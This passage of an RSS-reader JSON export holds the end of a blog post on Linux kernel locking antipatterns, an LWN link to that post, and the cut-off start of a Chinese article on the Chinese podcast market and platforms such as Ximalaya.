weak references are such a standard pattern <code>struct kref</code> has\nready-made support for them. The simple approach is using\n<code>kref_put_mutex()</code> with the same lock that also protects the\nstructure containing the weak reference. This guarantees that either the weak\nreference pointer is gone too, or there is at least somewhere still a strong\nreference around and it is therefore safe to call <code>kref_get()</code>. But\nthere are some issues with this approach:</p>\n\n<ul>\n  <li>\n    <p>It doesn’t compose to multiple weak references, at least if they are protected\nby different locks - all the locks need to be taken before the final\n<code>kref_put()</code> is called, which means minimally some pain with lock\nnesting and you get to hand-roll it all to boot.</p>\n  </li>\n  <li>\n    <p>The mutex required to be held during the final put is the one which protects\nthe structure with the weak reference, and often has little to do with the\nobject that’s being destroyed. So a pretty nasty violation of the <a href=\"http://blog.ffwll.ch/#level-1-big-dumb-lock\">big dumb\nlock pattern</a>. Furthermore the lock is held\nover the entire cleanup function, which defeats the point of the <a href=\"http://blog.ffwll.ch/#locking-pattern-reference-counting\">reference\ncounting pattern</a>, which is meant to\nenable “no locking” cleanup code. It becomes very tempting to stuff random\nother pieces of code under the protection of this look, making it a sprawling\nmess and violating the <a href=\"http://blog.ffwll.ch/2022/07/locking-engineering.html#protect-data-not-code\">principle to protect data, not\ncode</a>: The\nlock held during the entire cleanup operation is protecting against that\ncleanup code doing things, and not anymore a specific data structure.</p>\n  </li>\n</ul>\n\n<p>The much better approach is using <code>kref_get_unless_zero()</code>, together\nwith a spinlock for your data structure containing the weak reference. This\nlooks especially nifty in combination with <code>struct xarray</code>.</p>\n\n<div><div><pre><code>obj_find_in_cache(id)\n{\n\txa_lock();\n\tobj = xa_find(id);\n\tif (!kref_get_unless_zero(&amp;obj-&gt;kref))\n\t\tobj = NULL;\n\txa_unlock();\n\n\treturn obj;\n}\n</code></pre></div></div>\n\n<p>With this all the issues are resolved:</p>\n\n<ul>\n  <li>\n    <p>Arbitrary amounts of weak references in any kind of structures protected by\ntheir own spinlock can be added, without causing dependencies between them.</p>\n  </li>\n  <li>\n    <p>In the object’s cleanup function the same spinlock only needs to be held right\naround when the weak references are removed from the lookup structure. The\nlock critical section is no longer needlessly enlarged, we’re back to\nprotecting data instead of code.</p>\n  </li>\n</ul>\n\n<p>With both together the locking does no longer leak beyond the lookup structure\nand it’s associated code any more, unlike with <code>kref_put_mutex()</code> and\nsimilar approaches.  Thankfully <code>kref_get_unless_zero()</code> has become\nthe much more popular approach since it was added 10 years ago!</p>\n\n<h2>Locking Antipattern: Confusing Object Lifetime and Data Consistency</h2>\n\n<p>We’ve now seen a few examples where the <a href=\"http://blog.ffwll.ch/#level-0-no-locking\">“no locking” patterns from level\n0</a> collide in annoying ways when more locking is added to\nthe point where we seem to violate the <a href=\"http://blog.ffwll.ch/2022/07/locking-engineering.html#protect-data-not-code\">principle to protect data, not\ncode</a>. It’s worth to\nlook at this a bit closer, since we can generalize what’s going on here to a\nfairly high-level antipattern.</p>\n\n<p>The key insight is that the “no locking” patterns all rely on memory barrier\nprimitives in disguise, not classic locks, to synchronize access between\nmultiple threads. In the case of the <a href=\"http://blog.ffwll.ch/#locking-pattern-single-owner\">single owner\npattern</a> there might also be blocking semantics\ninvolved, when the next owner needs to wait for the previous owner to finish\nprocessing first. These are functions like <code>flush_work()</code> or the\nvarious wait functions like <code>wait_event()</code> or\n<code>wait_completion()</code>.</p>\n\n<p>Calling these barrier functions while holding locks commonly leads to issues:</p>\n\n<ul>\n  <li>\n    <p>Blocking functions like <code>flush_work()</code> pull in every lock or other\ndependency the work we wait on, or more generally, any of the previous owners\nof an object needed as a so called cross-release dependency. Unfortunately\nlockdep does not understand these natively, and the usual tricks to add manual\nannotations have severe limitations. There’s work ongoing to add\n<a href=\"https://lwn.net/Articles/709849/\">cross-release dependency tracking to\nlockdep</a>, but nothing looks anywhere near\nready to merge. Since these dependency chains can be really long and get ever\nlonger when more code is added to a worker - dependencies are pulled in even\nif only a single lock is held at any given time - this can quickly become a\nnightmare to untangle.</p>\n  </li>\n  <li>\n    <p>Often the requirement to hold a lock over these barrier type functions comes\nfrom the fact that the object would disappear. Or otherwise undergo some\nserious confusion about it’s lifetime state - not just whether it’s still\nalive or getting destroyed, but also who exactly owns it or whether it’s maybe\na resurrected zombie representing a different instance now. This encourages\nthat the lock morphs from a “protects some specific data” to a “protects\nspecific code from running” design, leading to all the code maintenance issues\ndiscussed in the <a href=\"http://blog.ffwll.ch/2022/07/locking-engineering.html#protect-data-not-code\">protect data, not code\nprinciple</a>.</p>\n  </li>\n</ul>\n\n<p>For these reasons try as hard as possible to not hold any locks, or as few as\nfeasible, when calling any of these memory barriers in disguise functions used\nto manage object lifetime or ownership in general. The antipattern here is\nabusing locks to fix lifetime issues. We have seen two specific instances thus\nfar:</p>\n\n<ul>\n  <li>\n    <p><code>kref_put_mutex</code> instead of <code>kref_get_unless_zero()</code> in\nthe <a href=\"http://blog.ffwll.ch/#locking-pattern-weak-reference\">weak reference pattern</a>. This is a\nspecial case of the <a href=\"http://blog.ffwll.ch/#locking-pattern-reference-counting\">reference counting\npattern</a>, but with some finer-grained\nlocking added to support weak references.</p>\n  </li>\n  <li>\n    <p>Calling <code>flush_work()</code> while holding locks in the <a href=\"http://blog.ffwll.ch/#locking-pattern-async-processing\">async\nworker</a>. This is a special case of the\n<a href=\"http://blog.ffwll.ch/#locking-pattern-single-owner\">single owner pattern</a>, again with a bit more\nlocking added to support some mutable state.</p>\n  </li>\n</ul>\n\n<p>We will see some more, but the antipattern holds in general as a source of\ntroubles.</p>\n\n<h2> Level 2.5: Splitting Locks for Performance\nReasons</h2>\n\n<p>We’ve looked at a pile of functional reasons for complicating the locking\ndesign, but sometimes you need to add more fine-grained locking for performance\nreasons. This is already getting dangerous, because it’s very tempting to tune\nsome microbenchmark just because we can, or maybe delude ourselves that it will\nbe needed in the future. Therefore only complicate your locking if:</p>\n\n<ul>\n  <li>\n    <p>You have actual real world benchmarks with workloads relevant to users that\nshow measurable gains outside of statistical noise.</p>\n  </li>\n  <li>\n    <p>You’ve fully exhausted architectural changes to outright avoid the overhead,\nlike io_uring pre-registering file descriptors locally to avoid manipulating\nthe file descriptor table.</p>\n  </li>\n  <li>\n    <p>You’ve fully exhausted algorithm improvements like batching up operations to\namortize locking overhead better.</p>\n  </li>\n</ul>\n\n<p>Only then make your future maintenance pain guaranteed worse by applying more\ntricky locking than the bare minimum necessary for correctness. Still, go with the simplest approach, often converting a lock to its read-write\nvariant is good enough.</p>\n\n<p>Sometimes this isn’t enough, and you actually have to split up a lock into more\nfine-grained locks to achieve more parallelism and less contention among\nthreads. Note that doing so blindly will backfire because locks are not free.\nWhen common operations still have to take most of the locks anyway, even if it’s\nonly for short time and in strict succession, the performance hit on single\nthreaded workloads will not justify any benefit in more threaded use-cases.</p>\n\n<p>Another issue with more fine-grained locking is that often you cannot define a\nstrict nesting hierarchy, or worse might need to take multiple locks of the same\nobject or lock class. I’ve written previously about this specific issue, and\nmore importantly, <a href=\"http://blog.ffwll.ch/2020/08/lockdep-false-positives.html#fighting-lockdep-badly\">how to teach lockdep about lock nesting, the bad and the\ngood ways</a>.</p>\n\n<p>One really entertaining story from the GPU subsystem, for bystanders at least,\nis that we really screwed this up for good by defacto allowing userspace to\ncontrol the lock order of all the objects involved in an IOCTL. Furthermore\ndisjoint operations should actually proceed without contention. If\nyou ever manage to repeat this feat you can take a look at the <a href=\"https://www.kernel.org/doc/html/latest/locking/ww-mutex-design.html\">wait-wound\nmutexes</a>.\nOr if you just want some pretty graphs, <a href=\"https://lwn.net/Articles/548909/\">LWN has an old article about wait-wound\nmutexes too</a>.</p>\n\n<h2> Level 3: Lockless Tricks</h2>\n\n<p>Do not go here wanderer!</p>\n\n<p>Seriously, I have seen a lot of very fancy driver subsystem locking designs, I\nhave not yet found a lot that were actually justified. Because only real world,\nnon-contrived performance issues can ever justify reaching for this level, and\nin almost all cases algorithmic or architectural fixes yield much better\nimprovements than any kind of (locking) micro-optimization could ever hope for.</p>\n\n<p>Hence this is just a long list of antipatterns, so that people who have not yet\na grumpy expression permanently chiseled into their facial structure know when\nthey’re in trouble.</p>\n\n<p>Note that this section isn’t limited to lockless tricks in the academic sense of\nguaranteed constant overhead forward progress, meaning no spinning or retrying\nanywhere at all. It’s for everything which doesn’t use standard locks like\n<code>struct mutex</code>, <code>spinlock_t</code>, <code>struct\nrw_semaphore</code>, or any of the others provided in the Linux kernel.</p>\n\n<h3>Locking Antipattern: Using RCU</h3>\n\n<p>Yeah RCU is really awesome and impressive, but it comes at serious costs:</p>\n\n<ul>\n  <li>\n    <p>By design, at least with standard usage, RCU elevates <a href=\"http://blog.ffwll.ch/#locking-antipattern-confusing-object-lifetime-and-data-consistency\">mixing up lifetime and\nconsistency\nconcerns</a>\nto a virtue. <code>rcu_read_lock()</code> gives you both a read-side critical\nsection <em>and</em> it extends the lifetime of any RCU protected object. There’s\nabsolutely no way you can avoid that antipattern, it’s built in.</p>\n\n    <p>Worse, RCU read-side critical section nest rather freely, which means unlike\nwith real locks abusing them to keep objects alive won’t run into nasty locking\ninversion issues when you pull that stunt with nesting different objects or\nclasses of objects. Using locks to paper over lifetime issues is bad, but with\nRCU it’s weapons-grade levels of dangerous.</p>\n  </li>\n  <li>\n    <p>Equally nasty, RCU practically forces you to deal with zombie objects, which\nbreaks the <a href=\"http://blog.ffwll.ch/#locking-pattern-reference-counting\">reference counting pattern</a>\nin annoying ways.</p>\n  </li>\n  <li>\n    <p>On top of all this breaking out of RCU is costly and kinda defeats the point,\nand hence there’s a huge temptation to delay this as long as possible. Meaning\ncheck as many things and dereference as many pointers under RCU protection as\nyou can, before you take a real lock or upgrade to a proper reference with\n<code>kref_get_unless_zero()</code>.</p>\n\n    <p>Unless extreme restraint is applied this results in RCU leading you towards\nlocking antipatterns. Worse RCU tends to spread them to ever more objects and\never more fields within them.</p>\n  </li>\n</ul>\n\n<p>All together all freely using RCU achieves is proving that there really is no\nbottom on the code maintainability scale. It is not a great day when your driver\ndies in <code>synchronize_rcu()</code> and lockdep has no idea what’s going on,\nand I’ve seen such days.</p>\n\n<p>Personally I think in driver subsystem the most that’s still a legit and\njustified use of RCU is for object lookup with <code>struct xarray</code> and\n<code>kref_get_unless_zero()</code>, and cleanup handled entirely by\n<code>kfree_rcu()</code>. Anything more and you’re very likely chasing a rabbit\ndown it’s hole and have not realized it yet.</p>\n\n<h3>Locking Antipattern: Atomics</h3>\n\n<p>Firstly, Linux atomics have two annoying properties just to start:</p>\n\n<ul>\n  <li>\n    <p>Unlike e.g. C++ atomics in userspace they are unordered or weakly ordered\nby default in a lot of cases. A lot of people are surprised by that, and then\nhave an even harder time understanding the memory barriers they need to\nsprinkle over the code to make it work correctly.</p>\n  </li>\n  <li>\n    <p>Worse, many atomic functions neither operate on the atomic types\n<code>atomic_t</code> and <code>atomic64_t</code> nor have <code>atomic</code>\nanywhere in their names, and so pose serious pitfalls to reviewers:</p>\n    <ul>\n      <li><code>READ_ONCE()</code> and <code>WRITE_ONCE</code> for volatile stores and\nloads.</li>\n      <li><code>cmpxchg()</code> and the various variants of atomic exchange with or\nwithout a compare operation.</li>\n      <li>Atomic bitops like <code>set_bit()</code> are all atomic. Worse, their\nnon-atomic variants have the <code>__set_bit()</code> double underscores to\nscare you away from using them, despite that these are the ones you really\nwant by default.</li>\n    </ul>\n  </li>\n</ul>\n\n<p>Those are a lot of unnecessary trap doors, but the real bad part is what people\ntend to build with atomic instructions:</p>\n\n<ul>\n  <li>\n    <p>I’ve seen at least three different, incomplete and ill-defined\nreimplementations of read write semaphores without lockdep support. Reinventing\ncompletions is also pretty popular. Worse, the folks involved didn’t realize\nwhat they built. That’s an impressive violation of the <a href=\"http://blog.ffwll.ch/2022/07/locking-engineering.html#2-make-it-correct\">“Make it Correct”\nprinciple</a>.</p>\n  </li>\n  <li>\n    <p>It seems very tempting to build terrible variations of the <a href=\"http://blog.ffwll.ch/#level-0-no-locking\">“no locking”\npatterns</a>. It’s very easy to screw them up by extending\nthem in a bad way, e.g. reference counting with weak reference or RCU\noptimizations done wrong very quickly leads to a complete mess. There are \nreasons why you should never deviate from these.</p>\n  </li>\n  <li>\n    <p>What looks innocent are statistical counters with atomics, but almost always\nthere’s already a lock you could take instead of unordered counter updates.\nOften resulting in better code organization to boot since the statistics for a\nlist and it’s manipulation are then closer together. There are some exceptions\nwith real performance justification, a recent one I’ve seen is memory\nshrinkers where you really want your <code>shrinker-&gt;count_objects()</code> to\nnot have to acquire any locks.  Otherwise in a memory intense workload all\nthreads are stuck on the one thread doing actual reclaim holding the same lock\nin your <code>shrinker-&gt;scan_objects()</code> function.</p>\n  </li>\n</ul>\n\n<p>In short, unless you’re actually building a new locking or synchronization\nprimitive in the core kernel, you most likely do not want to get seen even\nlooking at atomic operations as an option.</p>\n\n<h3>Locking Antipattern: <code>preempt/local_irq/bh_disable()</code> and Friends …</h3>\n\n<p>This one is simple: Lockdep doesn’t understand them. The real-time folks hate\nthem. Whatever it is you’re doing, use proper primitives instead, and at least\nread up on the <a href=\"https://lwn.net/Articles/828477/\">LWN coverage on why these are\nproblematic what to do instead</a>. If you need\nsome kind of synchronization primitive - maybe to avoid the <a href=\"http://blog.ffwll.ch/#locking-antipattern-confusing-object-lifetime-and-data-consistency\">lifetime vs.\nconsistency antipattern\npitfalls</a> -\nthen use the proper functions for that like <code>synchronize_irq()</code>.</p>\n\n<h3>Locking Antipattern: Memory Barriers</h3>\n\n<p>Or more often, lack of them, incorrect or imbalanced use of barriers, badly or\nwrongly or just not at all documented memory barriers, or …</p>\n\n<p>Fact is that exceedingly most kernel hackers, and more so driver people, have no\nuseful understanding of the Linux kernel’s memory model, and should never be\ncaught entertaining use of explicit memory barriers in production code.\nPersonally I’m pretty good at spotting holes, but I’ve had to learn the hard way\nthat I’m not even close to being able to positively prove correctness. And for\nbetter or worse, nothing short of that tends to cut it.</p>\n\n<p>For a still fairly cursory discussion read the <a href=\"https://lwn.net/Articles/844224/\">LWN series on lockless\nalgorithms</a>. If the code comments and commit\nmessage are anything less rigorous than that it’s fairly safe to assume there’s\nan issue.</p>\n\n<p>Now don’t get me wrong, I love to read an article or watch a talk by Paul\nMcKenney on RCU like anyone else to get my brain fried properly. But aside from\nextreme exceptions this kind of maintenance cost has simply no justification in\na driver subsystem. At least unless it’s packaged in a driver hacker proof\nlibrary or core kernel service of some sorts with all the memory barriers well\nhidden away where ordinary fools like me can’t touch them.</p>\n\n<h2>Closing Thoughts</h2>\n\n<p>I hope you enjoyed this little tour of progressively more worrying levels of\nlocking engineering, with really just one key take away:</p>\n\n<p>Simple, dumb locking is good locking, since with that you have a fighting chance\nto make it correct locking.</p>\n\n<p>Thanks to Daniel Stone and Jason Ekstrand for reading and commenting on drafts\nof this text.</p>"
    },
    "origin": {
        "streamId": 35,
        "title": "stuff by danvet",
        "htmlUrl": "http://blog.ffwll.ch/",
        "feedUrl": "https://blog.ffwll.ch/feed.xml"
    }
},
{
    "id": "903681",
    "timestampUsec": "1659536025144495",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Vetter: Locking engineering hierarchy",
    "author": ";corbet",
    "published": 1659534120,
    "updated": 1659534120,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/903681/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "Daniel Vetter <a href=\"https://blog.ffwll.ch/2022/08/locking-hierarchy.html\">continues his\nseries</a> on locking in the kernel.\n<p>\n</p><blockquote>\n\n\tThis part goes through a pile of locking pattern and designs, from\n\tmost favourable and easiest to adjust and hence resulting in a long\n\tterm maintainable code base, to the least favourable since hardest\n\tto ensure it works correctly and stays that way while the code\n\tevolves. For convenience even color coded, with the dangerous\n\tlevels getting progressively more crispy red indicating how close\n\tto the burning fire you are! Think of it as Dante’s Inferno, but\n\tfor locking.\n</blockquote><br clear=\"all\"><table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://sspai.com/post/74874",
    "timestampUsec": "1659690833036947",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "一篇文章，读懂中文播客前世今生",
    "author": ";拐子狼",
    "published": 1659686400,
    "updated": 1659686400,
    "alternate": [
        {
            "href": "https://sspai.com/post/74874",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>中文播客，何去何从？</h2><p>本文旨在讨论中文播客市场未来发展的可能性。为了还原推导过程，主要使用了三个章节：中文播客的现在（困境）、过去（时刻）、未来（答案）。在每个章节里，我会对市场中的上、中、下游加以讨论，分别是影响产业的时代背景、掌管内容方向的创作者和面向消费场景的平台。</p><p>文章很长，约两万七千余字，资料筹备前后耗时两年。如果对历史环节和论证部分不感兴趣，可以直接看最后的结论部分。 </p><h2>现在：中文播客的困境</h2><p>从 2004 年算起，中文播客的发展已经来到了第十八个年头。对于个体而言，十八岁是成年人的标志、成熟的印迹；但对于尤其是处于互联网时代的产业而言，十八年已太过漫长，足够市场发生翻天覆地的变化。然而即便时光荏苒，中文播客市场依然小众，还远没有开花结果。也许媒介长存，但人无法永远年轻。几代从业者前赴后继，答案依然迷茫。中文播客的过去，<a href=\"https://www.xiaoyuzhoufm.com/episode/5e280faa418a84a0461fa006?s=eyJ1IjogIjVlNTE3MGQ1ZTNlZGZjMmFiYjA3NDBlMSJ9\" target=\"_blank\">谁会记得它的模样</a>？<sup href=\"https://www.xiaoyuzhoufm.com/episode/5e280faa418a84a0461fa006?s=eyJ1IjogIjVlNTE3MGQ1ZTNlZGZjMmFiYjA3NDBlMSJ9\" title=\"此处引用「日谈公园」第一期：只有你记得我的模样\" footnote-id=\"1\">1</sup> 中文播客的未来，从一门生意的角度看，<a href=\"https://www.xiaoyuzhoufm.com/episode/5e4ee557418a84a0466737c2?s=eyJ1IjogIjVlNTE3MGQ1ZTNlZGZjMmFiYjA3NDBlMSJ9\" target=\"_blank\">又将如何续命？</a><sup href=\"https://www.xiaoyuzhoufm.com/episode/5e4ee557418a84a0466737c2?s=eyJ1IjogIjVlNTE3MGQ1ZTNlZGZjMmFiYjA3NDBlMSJ9\" title=\"此处引用「忽左忽右」第一期：美国媒体如何续命\" footnote-id=\"2\">2</sup></p><h3>UGC、PUGC 创作者的困境</h3><p>我已经不记得这是第几次手机的卡顿了，在优化相册、删除缓存和不常用的软件后，所剩的空间依然捉襟见肘。打开存储空间设置，和所有人一样，傲立在榜首的是小而美的微信；其后则有照片、视频 app、音乐 app 等等。已经删无可删了，我只好把视线转移到榜二位置的那个软件上。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/0bbe0a510a2f1a1b389c9087a24ef261.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/0bbe0a510a2f1a1b389c9087a24ef261.jpg\" referrerpolicy=\"no-referrer\"><figcaption>MOTIV Audio 和舒尔麦克风</figcaption></figure><p>「MOTIV Audio」是舒尔麦克风的配套 app。过去几年里，我用它录制了一些播客。其中有自言自语的「偶尔读书」，有和朋友聊天的「入侵耳朵」，还有记录原创歌曲的<a href=\"https://www.xiaoyuzhoufm.com/podcast/603d08ec3443e659b4ad0dd9?s=eyJ1IjogIjVlNTE3MGQ1ZTNlZGZjMmFiYjA3NDBlMSJ9\" target=\"_blank\">「停电时间」</a>。从类型上看，这些播客有访谈类，有对话类，有叙事类，有时间胶囊，也有声音碎片。有的可称为作品，有的只是随性。不论如何，制作播客节目已经成为了我日常创作的一部分。</p><p>但久而久之，即便在软件、硬件端都掌握了制作播客的能力，即便面对话题和灵感有了创作播客的动力，我的播客更新频次却越来越低。最终，我清理了 MOTIV Audio 里的文件，停止了托管服务 Typlog 的年度续费，剩下在小宇宙平台内的「停电时间」偶尔发一发歌。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/5c650ce1af1b8da57d555573184718a8.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/5c650ce1af1b8da57d555573184718a8.png\" referrerpolicy=\"no-referrer\"><figcaption>知名播客托管服务 Typlog</figcaption></figure><p>这似乎不是独属于我的状况。在日常的交流里，我发现很多朋友和我一样，有做播客的话题但没有伙伴讨论；和伙伴录制了播客却一直没有剪辑；剪好发送出来播放量又持续在个位数。克服了一个又一个难关后始终没有起色。长此以往，我们不再有继续更新的欲望。</p><p>如果说我和我的朋友们的为难依然只是个案，那么数据可能更有说服力。</p><p>毫无疑问，2020 年是中文播客的井喷之年。据播客搜索引擎 <a href=\"https://www.listennotes.com/podcast-stats/\" target=\"_blank\">ListenNotes</a> 统计，2020 年 4 月底时，中国内地的播客数量首次突破一万档，而在年底时更是达到 16448 档；据<a href=\"https://www.iresearch.com.cn/Detail/report?id=3909&amp;isfree=0\" target=\"_blank\">艾瑞咨询的研究和 MoonFM 的数据</a><sup href=\"https://www.iresearch.com.cn/Detail/report?id=3909&amp;isfree=0\" title=\"2021年中国网络音频产业研究报告\" footnote-id=\"3\">3</sup>显示，整个 2020 年中文播客新增 7869 档，是中文播客历史上新增播客最多的一年；然而到 2021 年增速就有所下滑，新增五千余档，未能保持 2020 年的增长率。时至今日（2022 年 7 月），中国内地播客总数为 24930 档，尽管较之 2020 年以前的数据来看翻倍不少，但从 2021 年初到现在一年半有余，只增长了 8482 档，日增量约 15 档，比起 2020 年下半年的日增约 27 档下滑颇多。除了增量的下跌外，新播客们的更新频率也非常低，许多处于半废弃状态。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/a963dcd4819fe4f6ac09336a000e9b47.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/a963dcd4819fe4f6ac09336a000e9b47.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://www.listennotes.com/podcast-stats/\" target=\"_blank\">ListenNotes 的数据</a></figcaption></figure><p>而从海外播客市场的普遍增长率来说，中文播客也并没有多少领先。在内地播客数量突破一万档的 2020 年 4 月，同期的英文播客有 83 万档；而如今内地播客数量达到 2.5 万档，英文播客数量则达到 174 万档。相较于中国大陆的人口数量，内地中文播客在全世界播客市场中不足百分之一的比例依然小到不起眼。</p><p>数据之外，真实的案例也不那么乐观：目前已超过四百五十万粉丝的 B 站知名 UP 主影视飓风曾在 2019 年尝试过播客创作，推出了一档名为「飓风播客」的影视自媒体向节目，后更名为<a href=\"https://www.xiaoyuzhoufm.com/podcast/60a20e9d9d5cd5d5b578b645?s=eyJ1IjogIjVlNTE3MGQ1ZTNlZGZjMmFiYjA3NDBlMSJ9\" target=\"_blank\">「无限进步」</a>。这似乎是播客进一步出圈的有力证明。这档播客除了由影视飓风的主心骨Tim主持外，还请到了飞猪当常驻嘉宾。有反波珠玉在前，又有影视飓风的金字招牌坐镇，「无限进步」看起来确实有无限的前途。然而，这样在自媒体中拥有黄金阵容的播客迄今为止只更新了三期，在 B 站的收听量不足二十万，在小宇宙更是在上过首页的前提下仍仅有几千关注。反观视频业务，每期播放量都在数十万到数百万级别，Tim 也多次在 Vlog 中表示自己的工作非常忙碌。因此，尽管 Tim 在个人频道中表示对播客兴趣颇深，最终也因为数据太差没有进一步耕耘播客业务。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/cc59b0e0bcdc0c9dc1a18f9010eb66bf.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/cc59b0e0bcdc0c9dc1a18f9010eb66bf.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://www.bilibili.com/video/BV1EP4y1x7ug?spm_id_from=333.999.0.0&amp;vd_source=becd8be72a0febd859aeafc5acca244f\" target=\"_blank\">Tim 在节目中介绍自己的播客设备</a></figcaption></figure><p>另一个例子更加耐人寻味。LOL 知名解说管泽元在 B 站的账号目前有四十万粉丝，近几期更新几乎没有画面内容，只是循环的背景和一些注释性质的图片，形式上非常接近播客；而连续几期的播放量都超过了百万。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/73381155bfa3f003cd50d5901ca86eaa.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/73381155bfa3f003cd50d5901ca86eaa.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://space.bilibili.com/271338616\" target=\"_blank\">知名解说管泽元的 B 站账号</a></figcaption></figure><p>对比之强烈某种意义上也解释了中文播客增速放缓的原因：也许头部播客仍在稳定增长，但在本来居于市场中供给端主流的 UGC 和 PUGC 两种创作者这里，相较于视频赛道，做播客是一个几无性价比的选择。</p><h3>平台的困境</h3><p>个人创作者的困境只能折射出市场的一部分剖面。要想看清问题的全貌，还要再看看平台的困境。</p><p>据中国网络视听节目服务协会（CNSA）发布的《中国网络视听发展研究报告》显示，2020 年，中国⽹络⾳频市场规模为 338.6 亿元。相比起疫情前 2019 年的 272.0 亿有所上升，但同比增长的 24.5% 并未达到市场整体 32.3% 的增速水平。其在整个网络视听行业市场规模中的占比也从 6% 降至 5.6%。相较起来，短视频用户才是整个中国网络视听市场的主要用户，占比不断提高。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/24ab5d5bf5f344f2c8720fa2babcf67b.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/24ab5d5bf5f344f2c8720fa2babcf67b.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"http://www.cnsa.cn/uploads/20210708/9040a5f9bc56e6fd690005818e087551.pdf\" target=\"_blank\">CNSA：2021中国网络视听发展研究报告</a></figcaption></figure><p>市场的缩水也令头部玩家万分焦急。作为中国音频平台的第一梯队，占据了 67% 市场份额的喜马拉雅在 2021 年五月赴美寻求上市，计划在纽交所挂牌。然而时运不济，滴滴事件<sup href=\"https://mp.weixin.qq.com/s/HbwgPPtCjUdf3-BmCAiJlA\" title=\"关于滴滴事件\" footnote-id=\"4\">4</sup>后，中文互联网公司的美股 IPO 之路基本断绝。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/0206da130ce1b8b432d6036bfbbc5466.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/0206da130ce1b8b432d6036bfbbc5466.png\" referrerpolicy=\"no-referrer\"><figcaption>晚点 LatePost：<a href=\"https://mp.weixin.qq.com/s/HbwgPPtCjUdf3-BmCAiJlA\" target=\"_blank\">中国互联网公司将更慎重地决定去哪里上市</a></figcaption></figure><p>2021 年 9 月，<a href=\"https://finance.ifeng.com/c/8GL7tW9udue\" target=\"_blank\">喜马拉雅撤回美股上市申请，转而寻求港股上市。</a><sup href=\"https://finance.ifeng.com/c/8GL7tW9udue\" title=\"中访网财经：三战 IPO，喜马拉雅没了想象力\" footnote-id=\"5\">5</sup>在其今年三月更新的招股书中显示，坐稳音频市场头把交椅的喜马拉雅公司在近些年营收增长的同时，<a href=\"https://baijiahao.baidu.com/s?id=1711776907094159804&amp;wfr=spider&amp;for=pc\" target=\"_blank\">亏损也进一步放大</a><sup href=\"https://baijiahao.baidu.com/s?id=1711776907094159804&amp;wfr=spider&amp;for=pc\" title=\"面包财经：喜马拉雅转赴香港上市 国内最大在线音频平台 盈利之路漫漫\" footnote-id=\"6\">6</sup>：2019 年至 2021 年，营业收入分别为 26.8 亿元、40.5 亿元、58.6 亿元；亏损分别为 19.2 亿元、28.8 亿元、51.1 亿元；经调整亏损分别为 7.486 亿元、5.394 亿元和 7.592 亿元，累计亏损依然超过 20 亿元。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/ef70ae7fd10ecab177f9a3dfbf3f976f.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/ef70ae7fd10ecab177f9a3dfbf3f976f.png\" referrerpolicy=\"no-referrer\"><figcaption>数据来自：<a href=\"https://www1.hkexnews.hk/app/sehk/2022/104331/documents/sehk22032900403_c.pdf\" target=\"_blank\">喜马拉雅招股书</a></figcaption></figure><p>持续亏损的窘境使冲击上市的喜马拉雅不得不做出取舍。据播客「新闻实验室」的主理人<a href=\"https://m.okjike.com/originalPosts/628cc71e150c9c7214664a86?s=ewoidSI6ICI1Nzg3NzUxMWRkZGU3ODExMDBlMzM2YmMiCn0%3D&amp;utm_source=wechat_session\" target=\"_blank\">方可成的动态爆料</a>，喜马拉雅已经搁置了对播客的投入。</p><p>这样的选择并不是没有端倪：为了提高来自播客的收入，<a href=\"https://baijiahao.baidu.com/s?id=1669544762684554010&amp;wfr=spider&amp;for=pc\" target=\"_blank\">2020 年时喜马拉雅就推出过《喜马拉雅主播/媒体自接广告合作政策（2020 年）》</a><sup href=\"https://baijiahao.baidu.com/s?id=1669544762684554010&amp;wfr=spider&amp;for=pc\" title=\"界面新闻：喜马拉雅推出多项强硬的广告合作政策，但内容创作者不愿买单\" footnote-id=\"7\">7</sup>，要求所有播客作者应在发布广告前应向平台报备包括广告客户信息、广告报价等在内的信息，并指出可能会因为未报备而导致节目下架。这使得播客圈颇为不满，数家播客联合抵制，最终导致喜马拉雅删除了文件。</p><p>早前，在 2021 年的 PodFest China 大会上，喜马拉雅副总裁、播客业务主管人殷启明透露，托管在喜马拉雅平台上的播客数量已经超过 23300 个；招股书也显示平台上可供收听的播客专辑已超过 800 